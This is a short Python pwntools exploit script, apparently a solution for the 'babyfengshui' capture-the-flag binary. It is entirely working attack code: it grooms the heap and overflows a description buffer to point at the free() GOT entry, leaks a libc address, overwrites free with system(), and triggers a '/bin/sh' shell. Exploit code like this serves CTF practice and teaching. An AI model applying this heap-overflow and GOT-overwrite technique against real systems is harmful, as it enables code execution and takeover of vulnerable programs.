#!/usr/bin/env python

from pwn import *

#context.log_level = 'debug'

io = process(['./babyfengshui'], env={'LD_PRELOAD':'./libc-2.19.so'})
elf = ELF('babyfengshui')
libc = ELF('libc-2.19.so')

def add_user(size, length, text):
    io.sendlineafter("Action: ", '0')
    io.sendlineafter("description: ", str(size))
    io.sendlineafter("name: ", 'AAAA')
    io.sendlineafter("length: ", str(length))
    io.sendlineafter("text: ", text)

def delete_user(idx):
    io.sendlineafter("Action: ", '1')
    io.sendlineafter("index: ", str(idx))

def display_user(idx):
    io.sendlineafter("Action: ", '2')
    io.sendlineafter("index: ", str(idx))

def update_desc(idx, length, text):
    io.sendlineafter("Action: ", '3')
    io.sendlineafter("index: ", str(idx))
    io.sendlineafter("length: ", str(length))
    io.sendlineafter("text: ", text)

if __name__ == "__main__":
    add_user(0x80, 0x80, 'AAAA')        # 0
    add_user(0x80, 0x80, 'AAAA')        # 1
    add_user(0x8, 0x8, '/bin/sh\x00')   # 2
    delete_user(0)

    add_user(0x100, 0x19c, "A"*0x198 + p32(elf.got['free']))    # 0

    display_user(1)
    io.recvuntil("description: ")
    free_addr = u32(io.recvn(4))
    system_addr = free_addr - (libc.symbols['free'] - libc.symbols['system'])
    log.info("system address: 0x%x" % system_addr)

    update_desc(1, 0x4, p32(system_addr))
    delete_user(2)

    io.interactive()
